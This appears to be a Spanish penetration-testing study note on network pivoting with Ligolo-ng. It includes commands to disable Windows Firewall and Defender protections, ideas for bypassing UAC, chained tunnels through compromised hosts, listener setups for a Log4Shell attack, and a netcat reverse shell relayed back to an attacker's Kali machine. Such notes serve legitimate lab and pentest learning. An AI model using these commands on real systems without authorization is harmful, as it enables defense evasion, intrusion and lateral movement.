# Pivoting 

Tags: #Pivoting #Ligolo 

El **pivoting** (también conocido como “hopping”) es una técnica utilizada en pruebas de penetración y en el análisis de redes que implica el uso de una máquina comprometida para atacar otras máquinas o redes en el mismo entorno.

Por ejemplo, si un atacante ha comprometido una máquina en una red corporativa, puede utilizar técnicas de pivoting para utilizar esa máquina como punto de salto para atacar otras máquinas en la misma red que de otra manera no serían accesibles. Esto se logra a través de la creación de túneles de comunicación desde la máquina comprometida a otras máquinas en la red.

El pivoting puede ser utilizado para superar restricciones de seguridad que de otra manera impedirían a un atacante acceder a determinadas máquinas o redes. Por ejemplo, si una red corporativa utiliza segmentación de red para separar diferentes partes de la red, el pivoting puede ser utilizado para superar esta restricción y permitir que un atacante salte de una red a otra.

## IMPORTANTE

```bash 
	TIP 1:

# Verificar estado actual antes de tocar nada
❯ netsh advfirewall show allprofiles state

# Deshabilitar Windows Firewall (requiere High integrity / SYSTEM)
❯ netsh advfirewall set allprofiles state off

# Deshabilita los 3 perfiles: Domain, Private y Public
# Necesario cuando el agente de Ligolo no logra conectar al proxy de Kali
# por reglas de firewall que bloquean la conexión saliente

# Alternativa — solo abrir el puerto específico sin deshabilitar todo (más sigiloso)
❯ netsh advfirewall firewall add rule name="Ligolo" dir=out action=allow protocol=TCP localport=<PORT>

❯ Set-MpPreference -DisableRealtimeMonitoring $true 
❯ Set-MpPreference -DisableScriptScanning $true 
❯ Set-MpPreference -DisableIOAVProtection $true

# Comprobaar el estado de Windows Defender 
❯ Get-MpComputerStatus | select RealTimeProtectionEnabled, AMSIEnabled

❯ sc query windefend
# Estado de Windows Defender

# PowerShell → deshabilitar Defender
❯ Set-MpPreference -DisableRealtimeMonitoring $true

❯ wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayName
# Ver antivirus instalado

# Restaurar al terminar (limpieza post-explotación)
❯ netsh advfirewall set allprofiles state on

	TIP 2:
Si el agente de Ligolo en Windows es bloqueado por UAC al ejecutarlo desde
una shell remota (WinRM, reverse shell, etc.), verificar el integrity level
del proceso:

    whoami /groups | findstr "Mandatory Label"

- High Mandatory Level  → ejecutar el agente directo, no hay problema
- Medium Mandatory Level → el token no está elevado, opciones:
    1. Bypass de UAC: Start-Process powershell.exe -Verb RunAs
    2. Ejecutar con runas y creds del admin
    3. Conectar por RDP (sesión interactiva) y ejecutarlo desde ahí
       → RDP garantiza el contexto de escritorio que UAC necesita para
         mostrar el prompt y permitir la elevación manual
```

## Ligolo (agente y proxy) 

* [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases)

![[ligolo_punto_a_punto_b.png]]


### Conectar Kali al Punto B por medio del Punto A  con un agente

```bash 
# Descargar agente y proxy 
NOTA: Cada vez que se quiera llegar a una red, se tiene que crear una nueva interfaz de red

PASO 1: 
❯ ./proxy -selfcert -laddr 0.0.0.0:11601      # Ejecutar el proxy en Kali con permisos de ejecución
❯ interface_create --name ligolo              # Crear la interfaz
❯ interface_add_route --name ligolo --route IP.0/24     # Agregar el segmento al cual se quiere llegar 


PASO 2: 
❯ chmod +x agent   # Permisos de ejecución 
❯ ./agent -connect IP_Kali:11601 -ignore-cert       # Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
	# IP = Direción IP de Kali
	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 


PASO 3:
# Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactivade ligolo
❯ session         # Mostrar las sesiones activas, seleccionar la sesión 1 y dar 'Enter'
❯ tunnel_start --tun ligolo   # Iniciar el tunelizado al segmento de red     
```

```bash 
EXTRA --> Si una vulne necesita puertos expecíficos se hace de la siguiente manera <--

PASO 4: # Esto es para la vulne Log4Shell 
# Sobre el agente de la máquina 'A' utiliza ligolo para redireccionar todo lo de Kali  
# Hacelo por puerto
❯ listener_add --addr 0.0.0.0:1389 --to 127.0.0.1:1389 --tcp  # LDAP Malicioso 
❯ listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp  # Servicio HHTP
❯ listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001 --tcp  # Revershell 

# Si se necesita una segunda revershell crear otro listener 
❯ listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp  # Revershell 2
```

```bash 
PASO 1:  # Interfaz modo manual 
❯ ip tuntap add user $USER mode tun ligolo       # Crear una interface de red llamada 'ligolo' en modo tunel en Kali
❯ ip link set ligolo up 
❯ ip route add IP.0/24 dev ligolo                # Agregar el segmento al cual se quiere llegar 
	# dev = Dispositivo llamado 'ligolo'

PASO 2: 
# Al terminar eliminar las rutas y la interfaz 'ligolo' en Kali 
❯ ip route del IP.0/24 dev ligolo    # Eliminar la ruta de la tabla de ruteo 
❯ ip link del ligolo                 # Eliminar la interface llamada 'ligolo'
❯ ip route list                      # Mirar la tabla de enrutamiento 
```

### Conectar Kali al Punto Final por medio del Punto B con un agente

```bash 
# Esto funciona cuando ya se tiene un primer túnel (Punto A) y se quiere crear un segundo túnel 

PASO 1:
❯ ip tuntap add user $USER mode tun ligolo2       # Crear una interface de red llamada 'ligolo2' en modo tunel en Kali
❯ ip link set ligolo2 up 
❯ ip route add IP.0/24 dev ligolo2                # Agregar el segmento al cual se quiere llegar 
	# dev = Dispositivo llamado 'ligolo2'


PASO 2: 
# Configuración en la interfaz de ligolo siempre a la máquina mas cercana
❯ listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp         # Todo el tráfico que reciba la máquina de salto por el puerto 8080 lo redirigirá al localhost de Kali por el puerto 80
❯ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp     # Todo el tráfico que reciba la máquina de salto por el puerto 11601 lo redirigirá al localhost de Kali por el puerto 11601
❯ listener_list     # Mirar las conexiones 


PASO 3:
# Para descargar el agente desde una segunda máquina víctima la cual pertenece al segmento de red no directo a Kali, se hace lo siguiente:
❯ wget http://IP_Vic1:8080/agent       # Ejecutar 'Wget' en la segunda máquina víctima y colocar la IP de la primer maquina víctima 'salto' en lugar de la IP de la maquina de Kali. Esto funcionará por el 'listener' que se ha configurado 
❯ python3 -m http.server 80            # Compartir el agente desde Kali por el puerto 80  


PASO 4: 
❯ chmod +x agent   # Permisos de ejecución 
❯ ./agent -connect IP_Vic1:11601 -ignore-cert       # Ejecutar el agente en la segunda máquina víctima
	# IP = Direción IP de la primer máquina víctima (Primer salto)
	# Port = Puerto en donde esta escuchando ligolo al ejecutar el proxy 


PASO 5:
# Una vez que en Kali muestre 'Agent join', dar 'Enter' para ingresar a la consola interactivade ligolo
❯ session                 # Mostrar las sesiones activas, seleccionar la sesión 2 y dar 'Enter'
❯ start --tun ligolo2     # Iniciar el tunelizado al segundo segmento de red especificando la interfaz
```

## Eliminar agente en Windows 

```powershell 
❯ tasklist | findstr agent          # Saber si un agente se esta ejecutando en Windows 
❯ taskkill /f /im agent_win.exe     # Eliminar todas las sesiones de los agentes en Windows 
```

## Hacer una Reverse Shell 

```bash 
# Para crear una revershell desde una tercer máquina víctima la cual pertenece al segmento de red no directo a la maquina Kali se hace lo siguiente: 


PASO 1: 
# Agregar los puertos para compartir el archivo y para la conexión de la revershell  
❯ session                 # Seleccionar la sesión mas lejana, en este caso la sesión 2 
❯ listener_add --addr 0.0.0.0:4444 --to IP_Vic2:4444 --tcp         # Todo el tráfico que reciba la máquina de salto por el puerto 4444 lo redirigirá al localhost de Kali por el puerto 4444
❯ listener_add --addr 0.0.0.0:8080 --to IP_Vic2:8080 --tcp
❯ session                 # Seleccionar la sesión 1
❯ listener_add --addr 0.0.0.0:4444 --to IP_Vic1:4444 --tcp 


PASO 2:
❯ nc IP 4444 -e /bin/bash   # Ejecutar 'Netcat' en la tercer máquina víctima y colocar la IP de la segunda maquina víctima 'salto' en lugar de la IP de la maquina de Kali. Esto funcionará por el 'listener' que se ha configurado.  
❯ nc -nlvp 4444             # Colocarse en escucha en Kali para recibir la revershell por el puerto 4444 
```

